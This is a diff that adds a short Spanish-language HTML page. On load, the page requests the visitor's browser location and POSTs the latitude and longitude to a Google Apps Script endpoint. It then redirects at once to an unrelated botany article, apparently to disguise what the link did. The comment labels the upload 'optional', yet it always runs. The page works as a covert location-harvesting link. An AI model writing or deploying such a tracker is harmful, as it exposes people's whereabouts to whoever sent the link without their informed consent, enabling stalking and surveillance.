@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Obteniendo Ubicación...</title>
+    <script>
+        function obtenerUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+
+                        // Enviar ubicación a un servidor (opcional)
+                        fetch("https://script.google.com/macros/s/AKfycbxbUQccFSD2beZZp2fHjrz1LYzp4OuMx1YM52R76FBmNGwZCuj_f2aBY0iFfAFMBOyb/exec", {
+                            method: "POST",
+                            headers: {"Content-Type": "application/json"},
+                            body: JSON.stringify({ latitud: lat, longitud: lon })
+                        });
+
+                        // Redirigir a otra página
+                        window.location.href = "https://concepto.de/botanica/"; // Cambia por tu URL destino
+                    },
+                    function(error) {
+                        alert("Activa la ubicación en tu navegador.");
+                    }
+                );
+            } else {
+                alert("Tu navegador no soporta geolocalización.");
+            }
+        }
+    </script>
+</head>
+<body onload="obtenerUbicacion()">
+    <h2>Obteniendo tu ubicación...</h2>
+</body>
+</html>
